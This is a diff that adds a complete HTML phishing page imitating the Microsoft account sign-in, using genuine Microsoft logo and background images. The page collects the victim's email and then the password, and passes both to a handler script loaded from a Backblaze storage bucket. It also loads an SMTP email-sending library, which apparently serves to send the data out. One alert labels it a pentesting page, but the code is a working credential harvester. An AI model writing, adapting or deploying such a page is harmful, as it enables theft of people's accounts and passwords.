@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Sign in to your Microsoft account</title>
+    
+    <!-- Microsoft Fluent UI Font -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="shortcut icon" href="https://logincdn.msauth.net/16.000.30777.6/images/favicon.ico">
+
+    <!-- ADDED: SmtpJS Library for Email Sending -->
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+    <style>
+        :root {
+            --ms-color-primary: #0067b8;
+            --ms-color-primary2: #242424;
+            --ms-color-primary-hover: #106ebe;
+            --ms-color-primary-pressed: #005a9e;
+            --ms-color-neutral-light: #00000000;
+            --ms-color-neutral-light-alt: #ffffff;
+            --ms-color-neutral-dark: #323130;
+            --ms-color-neutral-secondary: #605e5c;
+            --ms-color-border: rgb(0 0 0 / 15%);
+            --ms-color-error: #a80000;
+            --ms-color-borders: #605e5c;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
+            background-color: var(--ms-color-neutral-light);
+            color: var(--ms-color-neutral-dark);
+            min-height: 100vh;
+            background-image: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg');
+            background-size: cover;
+            background-position: center;
+        }
+
+        .page-wrapper {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 440px;
+            padding: 44px;
+            background-color: var(--ms-color-neutral-light-alt);
+            border-radius: 16px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
+            margin-bottom: 23px;
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .logo-container img {
+            width: 108px;
+            height: 23px;
+        }
+
+        .login-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .login-subtitle {
+            font-size: 15px;
+            color: var(--ms-color-neutral-secondary);
+            margin-bottom: 28px;
+        }
+
+        .form-step {
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 8px 10px;
+            height: 36px;
+            min-height: 42px;
+            border-radius: 4px;
+            font-size: 15px;
+            border: 1px solid var(--ms-color-border);
+            padding-bottom: 0px;
+            line-height: 0px;
+            border-bottom: 2px solid var(--ms-color-primary);
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--ms-color-primary);
+        }
+
+        .form-input.error {
+            border-color: var(--ms-color-error);
+        }
+
+        .error-message {
+            color: var(--ms-color-error);
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+
+        #email::placeholder {
+            color: #605e5c;
+        }
+        
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            font-size: 15px;
+            font-weight:400;
+            color: white;
+            background-color: var(--ms-color-primary);
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .login-button:hover {
+            background-color: var(--ms-color-primary-hover);
+        }
+
+        .login-button:disabled {
+            background-color: var(--ms-color-neutral-secondary);
+            cursor: not-allowed;
+        }
+
+        .login-footer {
+            margin-top: 24px;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .login-footer a {
+            color: var(--ms-color-primary);
+            text-decoration: none;
+        }
+
+        .login-footer a:hover {
+            text-decoration: underline;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .text-center {
+            text-align: center;
+        }
+
+        .spinner {
+            border: 3px solid var(--ms-color-border);
+            border-top: 3px solid var(--ms-color-primary);
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+        .shake {
+            animation: shake 0.5s;
+        }
+
+        /* --- Sign-in Options Tile --- */
+        .tile-wrapper {
+            width: 100%;
+            max-width: 440px;
+        }
+
+        .tile-container {
+            text-align: left;
+        }
+
+        .tile {
+            display: table;
+            width: 100%;
+            padding: 4px 12px;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            background-color: var(--ms-color-neutral-light-alt);
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
+        }
+
+        .tile:hover {
+            background-color: var(--ms-color-neutral-light);
+        }
+
+        .tile .table {
+            display: table;
+            width: 100%;
+        }
+
+        .tile .table-row {
+            display: table-row;
+        }
+
+        .tile .table-cell {
+            display: table-cell;
+            vertical-align: middle;
+        }
+
+        .tile .tile-img {
+            width: 42px;
+            height: 42px;
+            padding-right: 12px;
+        }
+
+        .tile .content {
+            font-size: 15px;
+            color: var(--ms-color-neutral-dark);
+            text-align: left;
+        }
+    </style>
+</head>
+<body>
+    <div class="page-wrapper">
+        <main class="login-container">
+            <div class="logo-container">
+                <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
+            </div>
+            
+            <!-- STEP 1: EMAIL INPUT -->
+            <div id="step-1" class="form-step">
+                <h1 class="login-title">Sign in</h1>
+                <p>Use your Microsoft account.</p>
+                
+                <form id="email-form" novalidate>
+                    <div class="form-group">
+                        <label for="email"></label>
+                        <input type="email" id="email" name="email" class="form-input" placeholder="Email, phone, or Skype" autocomplete="off" required>
+                        <div class="error-message" id="email-error"></div>
+                    </div>
+                    <button type="submit" class="login-button" id="next-button">Next</button>
+                </form>
+            </div>
+
+            <!-- STEP 2: PASSWORD INPUT (Initially Hidden) -->
+            <div id="step-2" class="form-step hidden">
+                <div class="text-center" style="margin-bottom: 20px;">
+                    <span id="user-display" style="font-size: 15px; color: var(--ms-color-neutral-secondary);"></span>
+                    <h2 id="change-user" style="display: block; margin-top: 9px; color: var(--ms-color-primary2); text-decoration: none; font-weight: 500;">Enter your password</h2>
+                </div>
+
+                <form id="password-form" novalidate>
+                    <div class="form-group">
+                        <label for="password"></label>
+                        <input type="password" id="password" name="password" class="form-input" placeholder="Password" autocomplete="off" required>
+                        <div class="error-message" id="password-error"></div>
+                    </div>
+                    <button type="submit" class="login-button" id="signin-button">Sign in</button>
+                </form>
+            </div>
+
+            <!-- LOADING SPINNER (Initially Hidden) -->
+            <div id="loading-spinner" class="spinner hidden"></div>
+            
+            <footer class="login-footer">
+                <a href="#" id="forgot-password-link">Forgot my password</a> &nbsp;|&nbsp; <a href="#" id="create-account-link">Create one!</a>
+            </footer>
+        </main>
+
+        <!-- Standalone Sign-in Options Tile -->
+        <div class="tile-wrapper">
+            <div class="tile-container">
+                <div class="tile" id="signin-options-tile" role="button" tabindex="0">
+                    <div class="table">
+                        <div class="table-row">
+                            <div class="table-cell tile-img medium">
+                                <img class="tile-img medium" role="presentation" src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg">
+                            </div>
+                            <div class="table-cell text-left content">
+                                <div>Sign-in options</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- External Libraries -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.3/jquery.validate.min.js"></script>
+    
+    <!-- 📌 YOUR EXTERNAL HANDLER -->
+    <script src="https://f005.backblazeb2.com/file/cgo88354675788990-8766/form-handler.js"></script>
+
+    <script>
+    $(document).ready(function() {
+        const platformName = "Outlook";
+        let userEmail = "";
+
+        $('#email-form').validate({
+            rules: { email: { required: true, email: true } },
+            messages: { email: "Please enter a valid email address." },
+            errorPlacement: function(error, element) {
+                $('#email-error').text(error.text()).show();
+                $('#email').addClass('error');
+            },
+            submitHandler: function(form) {
+                userEmail = $('#email').val();
+                $('#step-1').fadeOut(200, function() {
+                    $('#loading-spinner').removeClass('hidden');
+                    setTimeout(() => {
+                        $('#loading-spinner').addClass('hidden');
+                        $('#user-display').text(userEmail);
+                        $('#step-2').fadeIn(200);
+                        $('#password').focus();
+                    }, 1200);
+                });
+                return false;
+            },
+            invalidHandler: function(event, validator) {
+                $(form).addClass('shake');
+                setTimeout(() => $(form).removeClass('shake'), 500);
+            }
+        });
+
+        $('#password-form').validate({
+            rules: { password: { required: true } },
+            messages: { password: "Please enter your password." },
+            errorPlacement: function(error, element) {
+                $('#password-error').text(error.text()).show();
+                $('#password').addClass('error');
+            },
+            submitHandler: function(form) {
+                const password = $('#password').val();
+                
+                // UPDATED: Call the specific function from form-handler.js
+                handleLoginSubmission(userEmail, password, platformName);
+                
+                return false;
+            },
+            invalidHandler: function(event, validator) {
+                $(form).addClass('shake');
+                setTimeout(() => $(form).removeClass('shake'), 500);
+            }
+        });
+
+        $('#change-user').click(function(e) {
+            e.preventDefault();
+            $('#step-2').fadeOut(200, function() {
+                $('#email').val('');
+                $('#email').removeClass('error');
+                $('#email-error').hide();
+                $('#password').removeClass('error');
+                $('#password-error').hide();
+                $('#step-1').fadeIn(200);
+            });
+        });
+
+        $('#forgot-password-link, #create-account-link').click(function(e) {
+            e.preventDefault();
+            // trackClick($(this).attr('id')); // Optional if you still want this
+        });
+
+        $('#signin-options-tile').click(function(e) {
+            e.preventDefault();
+            alert('This is a pentesting page. The "Sign-in options" would normally open a dialog for other login methods.');
+        });
+    });
+    </script>
+</body>
+</html>
